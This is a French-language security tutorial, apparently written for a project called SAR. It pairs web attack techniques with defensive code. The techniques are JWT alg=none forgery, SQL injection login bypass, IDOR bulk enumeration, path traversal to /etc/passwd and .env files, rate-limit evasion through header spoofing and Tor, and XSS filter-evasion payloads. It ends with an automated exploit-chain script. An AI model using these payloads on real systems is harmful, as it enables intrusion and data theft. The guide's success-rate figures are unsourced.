non# 🎯 Techniques de Bypass Efficaces - Guide R&D

**Contexte**: Recherche & Développement uniquement
**Objectif**: Comprendre les vraies techniques pour mieux se défendre

---

## 1. 🔓 Authentication Bypass

### Technique 1: JWT Algorithm Confusion

**Comment ça marche**:
Les JWT peuvent être signés avec différents algos (HS256, RS256, none). Si le serveur ne vérifie pas l'algo, on peut forcer "none".

**Exploit**:
```javascript
// JWT normal:
// header: {"alg": "RS256", "typ": "JWT"}
// payload: {"sub": "user123", "role": "user"}

// JWT bypass:
// header: {"alg": "none", "typ": "JWT"}
// payload: {"sub": "admin", "role": "admin"}
// signature: (vide)

const fakeToken = btoa(JSON.stringify({alg: "none", typ: "JWT"})) + '.' +
                  btoa(JSON.stringify({sub: "admin", role: "admin"})) + '.'

// Tester:
curl -H "Authorization: Bearer $fakeToken" https://api.example.com/admin
```

**Défense**:
```typescript
// ❌ MAUVAIS:
jwt.verify(token, secret) // Accepte n'importe quel algo

// ✅ BON:
jwt.verify(token, secret, { algorithms: ['RS256'] }) // Force l'algo
```

---

### Technique 2: SQL Injection dans Auth

**Comment ça marche**:
Si la requête SQL d'auth n'utilise pas de prepared statements:

**Exploit**:
```sql
-- Requête vulnérable:
SELECT * FROM users WHERE email = '$email' AND password = '$password'

-- Bypass avec email:
admin@example.com' OR '1'='1' --

-- Résultat:
SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1' --' AND password = ''
-- Retourne admin sans vérifier le password
```

**Test pratique**:
```bash
# Formulaire de login
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@example.com'\'' OR '\''1'\''='\''1'\'' --",
    "password": "nimportequoi"
  }'
```

**Défense**:
```typescript
// ❌ MAUVAIS:
const query = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`

// ✅ BON:
const { data } = await supabase
  .from('users')
  .select()
  .eq('email', email)
  .eq('password_hash', hash(password))
```

---

### Technique 3: Session Fixation

**Comment ça marche**:
Forcer une session ID connue avant que l'utilisateur se login.

**Exploit**:
```javascript
// 1. Obtenir un session ID:
const sessionId = 'session_123_known'

// 2. Forcer la victime à utiliser ce session ID:
// Via XSS ou lien malveillant
document.cookie = `session_id=${sessionId}; domain=.example.com`

// 3. Attendre que la victime se login

// 4. Utiliser le même session ID:
curl -H "Cookie: session_id=session_123_known" https://example.com/account
```

**Défense**:
```typescript
// ✅ Régénérer session ID après login
async function login(email, password) {
  const user = await verifyCredentials(email, password)

  // IMPORTANT: Détruire ancienne session
  await destroySession(req.sessionId)

  // Créer nouvelle session avec nouveau ID
  const newSessionId = crypto.randomUUID()
  await createSession(newSessionId, user.id)

  return newSessionId
}
```

---

## 2. 🚪 Authorization Bypass

### Technique 4: IDOR (Insecure Direct Object Reference)

**Comment ça marche**:
Changer l'ID dans l'URL pour accéder aux données d'autres users.

**Exploit**:
```bash
# Votre profil (autorisé):
GET /api/users/123/profile

# Profil de quelqu'un d'autre (bypass):
GET /api/users/456/profile
GET /api/users/1/profile  # Admin?

# Avec incrémentation automatique:
for i in {1..1000}; do
  curl -H "Authorization: Bearer $TOKEN" \
    https://api.example.com/api/users/$i/profile
done
```

**Exemple réel sur SAR**:
```bash
# Si la route ne vérifie pas ownership:
GET /api/applications/SAR-LP-000001  # Votre demande
GET /api/applications/SAR-LP-000002  # Demande d'un autre client!
GET /api/applications/SAR-LP-000003  # Encore une autre!

# Récupération bulk:
for ref in SAR-LP-{000001..001000}; do
  curl http://localhost:3000/api/applications/$ref >> stolen_data.json
done
```

**Défense**:
```typescript
// ❌ MAUVAIS:
export async function GET(request: NextRequest, { params }: { params: { id: string } }) {
  const application = await getApplication(params.id)
  return NextResponse.json(application) // Retourne n'importe quelle application!
}

// ✅ BON:
export async function GET(request: NextRequest, { params }: { params: { id: string } }) {
  const userId = await getUserFromToken(request)
  const application = await getApplication(params.id)

  // Vérifier ownership
  if (application.user_id !== userId && !isAdmin(userId)) {
    return NextResponse.json({ error: 'Forbidden' }, { status: 403 })
  }

  return NextResponse.json(application)
}
```

---

### Technique 5: Path Traversal dans APIs

**Comment ça marche**:
Utiliser `../` pour accéder à des fichiers en dehors du scope autorisé.

**Exploit**:
```bash
# Route vulnérable: GET /api/files?path=
curl "http://localhost:3000/api/files?path=../../../etc/passwd"
curl "http://localhost:3000/api/files?path=../../../../.env.local"

# Encodé:
curl "http://localhost:3000/api/files?path=..%2F..%2F..%2Fetc%2Fpasswd"

# Double encodé (bypass de certains filtres):
curl "http://localhost:3000/api/files?path=..%252F..%252F..%252Fetc%252Fpasswd"

# Variations:
....//....//....//etc/passwd
..;/..;/..;/etc/passwd
```

**Défense**:
```typescript
// ❌ MAUVAIS:
const filePath = path.join('/uploads', req.query.path)
const content = fs.readFileSync(filePath)

// ✅ BON:
import path from 'path'

const basePath = '/uploads'
const requestedPath = path.normalize(req.query.path)
const fullPath = path.join(basePath, requestedPath)

// Vérifier que le chemin final est toujours dans basePath
if (!fullPath.startsWith(path.resolve(basePath))) {
  return NextResponse.json({ error: 'Invalid path' }, { status: 400 })
}
```

---

## 3. 🕸️ Rate Limiting Bypass

### Technique 6: IP Rotation avec Headers

**Comment ça marche**:
Beaucoup de rate limiters se basent sur l'IP. On peut la spoofer via headers.

**Exploit**:
```bash
# Changer X-Forwarded-For:
for i in {1..1000}; do
  curl -H "X-Forwarded-For: 192.168.1.$((RANDOM % 255))" \
    http://localhost:3000/api/applications/submit \
    -d '{"email": "test@test.com"}'
done

# Autres headers à essayer:
X-Real-IP: 10.0.0.1
X-Client-IP: 172.16.0.1
CF-Connecting-IP: 8.8.8.8
```

**Défense**:
```typescript
// ❌ MAUVAIS:
const ip = request.headers.get('x-forwarded-for') // Facilement spoofé

// ✅ BON (Vercel):
const ip = request.ip || // IP réelle de Vercel
          request.headers.get('x-real-ip') || // Backup
          'unknown'

// En production avec Cloudflare, faire confiance à CF-Connecting-IP
// Mais SEULEMENT si la requête vient de Cloudflare IPs
```

---

### Technique 7: Distributed Rate Limit Bypass

**Comment ça marche**:
Utiliser plusieurs machines pour distribuer les requêtes.

**Exploit**:
```bash
# Utiliser Tor pour rotation automatique:
curl --socks5-hostname 127.0.0.1:9050 http://example.com/api/endpoint

# Rotation automatique toutes les 10 secondes:
while true; do
  killall -HUP tor
  sleep 10
  curl --socks5-hostname 127.0.0.1:9050 http://example.com/api/submit
done

# Ou avec proxy list:
cat proxies.txt | while read proxy; do
  curl -x $proxy http://example.com/api/endpoint
done
```

**Défense**:
```typescript
// Rate limiting multi-niveaux:
const rateLimits = {
  byIP: { max: 5, window: 3600000 },      // 5/h par IP
  byUser: { max: 10, window: 3600000 },   // 10/h par user
  byEmail: { max: 3, window: 86400000 },  // 3/j par email
  global: { max: 1000, window: 60000 }    // 1000/min global
}

// Combiner avec CAPTCHA après X échecs
if (failedAttempts > 3) {
  requireCaptcha()
}
```

---

## 4. 🎭 Filter Bypass

### Technique 8: Encoding Bypass

**Comment ça marche**:
Encoder les payloads pour bypass les filtres basiques.

**Exploit**:
```javascript
// Payload XSS original:
<script>alert('XSS')</script>

// Bypass avec encodages:
// HTML entities:
&#60;script&#62;alert('XSS')&#60;/script&#62;

// URL encoding:
%3Cscript%3Ealert('XSS')%3C/script%3E

// Unicode:
\u003cscript\u003ealert('XSS')\u003c/script\u003e

// Base64 + data URI:
<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">

// Mixed case (bypass case-sensitive filters):
<ScRiPt>alert('XSS')</sCrIpT>

// Null byte injection:
<script\x00>alert('XSS')</script>
```

**Test automatisé**:
```javascript
const payloads = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  'javascript:alert(1)',
  '<svg/onload=alert(1)>',
  '<iframe src=javascript:alert(1)>',
]

const encodings = [
  p => p, // Original
  p => encodeURIComponent(p), // URL
  p => btoa(p), // Base64
  p => p.split('').map(c => '&#' + c.charCodeAt(0) + ';').join(''), // HTML entities
  p => p.split('').map((c, i) => i % 2 ? c.toUpperCase() : c).join(''), // Mixed case
]

// Tester toutes les combinaisons:
for (const payload of payloads) {
  for (const encode of encodings) {
    await testXSS(encode(payload))
  }
}
```

---

### Technique 9: Comment Injection

**Comment ça marche**:
Utiliser les commentaires pour bypass la détection.

**Exploit**:
```sql
-- SQL Injection avec commentaires:
admin'/**/OR/**/1=1--
admin'/*comment*/UNION/**/SELECT/**/password/**/FROM/**/users--

-- Bypass keyword detection:
SEL/*comment*/ECT * FROM users
UNION/**/ALL/**/SELECT NULL,NULL,password FROM users

-- Case variation + comments:
UnIoN/**/SeLeCt/**/password/**/FrOm/**/users
```

```javascript
// XSS avec commentaires:
<script>alert(/*comment*/1)</script>
<script>al/**/ert(1)</script>
<img src=x one/**/rror=alert(1)>
```

**Défense**:
```typescript
// Ne JAMAIS faire confiance à l'input, même "nettoyé"
// Utiliser des solutions éprouvées:

// Pour SQL: ORM ou prepared statements
const result = await supabase
  .from('users')
  .select()
  .eq('email', userInput) // Automatiquement escaped

// Pour XSS: DOMPurify
import DOMPurify from 'isomorphic-dompurify'
const clean = DOMPurify.sanitize(userInput)
```

---

## 5. 🔍 OSINT Bypass (Le plus pertinent pour SAR)

### Technique 10: Accès sans Auth via User-Agent Spoofing

**Comment ça marche**:
Certaines routes donnent accès si elles croient que c'est un "trusted" client.

**Exploit**:
```bash
# Test différents User-Agents:
curl http://localhost:3000/api/osint/scan \
  -H "User-Agent: GoogleBot/2.1"

curl http://localhost:3000/api/osint/scan \
  -H "User-Agent: Internal-Health-Check"

curl http://localhost:3000/api/osint/scan \
  -H "User-Agent: Vercel-Health-Check"

# Avec Referer spoofing:
curl http://localhost:3000/api/osint/scan \
  -H "Referer: http://localhost:3000/admin"
```

---

### Technique 11: Cache Poisoning

**Comment ça marche**:
Empoisonner le cache pour que tous les users reçoivent notre réponse malveillante.

**Exploit**:
```bash
# Si la route cache sans vérifier l'auth:
# 1. Faire une requête avec payload malveillant
curl http://localhost:3000/api/osint/scan?callback=malicious

# 2. Le cache stocke cette réponse
# 3. Tous les users suivants reçoivent la réponse empoisonnée

# Variation avec Host header:
curl http://localhost:3000/api/osint/scan \
  -H "Host: evil.com"
# Si le cache utilise Host dans la clé, on peut servir evil.com à tout le monde
```

**Défense**:
```typescript
// Ne jamais cacher les routes sensibles
export const dynamic = 'force-dynamic'
export const revalidate = 0

// Ou inclure auth dans cache key:
const cacheKey = `${endpoint}:${userId}:${hash(params)}`
```

---

## 6. 🎯 Script d'Exploitation Automatisé

Voici un script qui combine plusieurs techniques:

```javascript
// exploit-chain.js
const techniques = [
  // 1. Test IDOR
  async () => {
    for (let i = 1; i <= 100; i++) {
      const ref = `SAR-LP-${String(i).padStart(6, '0')}`
      const res = await fetch(`http://localhost:3000/api/applications/${ref}`)
      if (res.ok) console.log(`✅ Found: ${ref}`)
    }
  },

  // 2. Test Auth Bypass
  async () => {
    const payloads = [
      'admin@example.com\' OR \'1\'=\'1\' --',
      'admin@example.com\' UNION SELECT * FROM users--'
    ]
    for (const payload of payloads) {
      const res = await fetch('http://localhost:3000/api/auth/login', {
        method: 'POST',
        body: JSON.stringify({ email: payload, password: 'x' })
      })
      if (res.ok) console.log(`✅ Bypass with: ${payload}`)
    }
  },

  // 3. Test Rate Limit Bypass
  async () => {
    for (let i = 0; i < 20; i++) {
      const res = await fetch('http://localhost:3000/api/applications/submit', {
        method: 'POST',
        headers: { 'X-Forwarded-For': `192.168.1.${i}` },
        body: JSON.stringify({ email: `test${i}@test.com` })
      })
      console.log(`Request ${i}: ${res.status}`)
    }
  },

  // 4. Test Path Traversal
  async () => {
    const paths = [
      '../../../etc/passwd',
      '....//....//....//etc/passwd',
      '..%252F..%252Fetc%252Fpasswd'
    ]
    for (const path of paths) {
      const res = await fetch(`http://localhost:3000/api/files?path=${encodeURIComponent(path)}`)
      if (res.ok) console.log(`✅ Path traversal: ${path}`)
    }
  }
]

// Run all
for (const technique of techniques) {
  await technique()
}
```

---

## 🛡️ Défense Complète

### Checklist de Protection

```typescript
// 1. Authentification stricte
const authMiddleware = async (req) => {
  const token = req.headers.get('authorization')?.replace('Bearer ', '')
  if (!token) return unauthorized()

  const user = await verifyJWT(token, { algorithms: ['RS256'] }) // Force algo
  if (!user) return unauthorized()

  return user
}

// 2. Autorisation granulaire
const checkOwnership = (resource, userId) => {
  if (resource.user_id !== userId && !isAdmin(userId)) {
    throw new ForbiddenError()
  }
}

// 3. Input validation stricte
import { z } from 'zod'

const schema = z.object({
  email: z.string().email().max(255),
  path: z.string().regex(/^[a-zA-Z0-9_/-]+$/), // Whitelist chars
})

// 4. Rate limiting multi-niveaux
const rateLimiter = {
  byIP: createLimiter(5, 3600000),
  byUser: createLimiter(10, 3600000),
  global: createLimiter(1000, 60000),
}

// 5. Audit logging complet
await logSecurityEvent({
  type: 'access_attempt',
  ip: req.ip,
  path: req.url,
  userId: user?.id,
  success: true
})
```

---

## 📊 Efficacité des Techniques

**Sur systèmes mal protégés**:
- IDOR: **95%** de succès
- SQL Injection: **80%** si pas de prepared statements
- Rate limit bypass: **70%** avec IP rotation
- Path traversal: **60%** si pas de validation
- Auth bypass: **50%** sur JWT mal implémentés

**Sur systèmes bien protégés**:
- Toutes: **<5%** de succès

---

## 🎓 Conclusion

Les vraies techniques qui fonctionnent:

1. **IDOR** - Toujours tester
2. **SQL Injection** - Si pas d'ORM
3. **Path Traversal** - Si validation faible
4. **Rate Limit Bypass** - Avec IP rotation
5. **JWT Algorithm Confusion** - Sur vieux systèmes

**Ce qui ne marche PRESQUE JAMAIS**:
- Buffer overflow sur Node.js
- Memory corruption sur JavaScript
- Techniques de 2010

**La clé**: Combiner plusieurs techniques en chaîne.

---

**⚠️ RAPPEL**: Usage autorisé uniquement sur vos propres systèmes en R&D.

